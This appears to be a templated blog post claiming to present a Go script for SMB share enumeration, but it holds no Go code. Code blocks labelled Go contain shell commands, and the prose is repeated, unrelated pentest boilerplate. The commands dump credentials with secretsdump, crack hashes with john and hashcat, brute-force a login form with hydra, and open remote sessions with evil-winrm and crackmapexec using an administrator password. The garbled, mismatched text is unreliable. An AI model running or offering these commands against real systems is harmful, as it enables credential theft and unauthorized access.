---
TitleSEO: "SMB Share Enumeration Script in Go | ZureFX"
TitlePost: "SMB Share Enumeration Script — Go"
Author: "ZureFX"
Description: "A Go script for smb share enumeration script. Built for security research and automation."
Keywords: "scanner, parser, powershell, rust, fuzzer, tool, go"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-453.html"
URL_IMAGES: ""
Date: "2025-11-06"
Tags: "Scanner, Parser, PowerShell, Rust, Fuzzer, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-453"
Permalink: "/scripting/script-smb-share-enumeration-script-453.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Go** for offensive security automation.

### Requirements

- Go
- `pwncat`
- `mimikatz`
- `impacket`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.91.185.64/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.12.57
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.21.122.183 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.218.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.61.127.205 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.71.197.77 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 18.51s
```
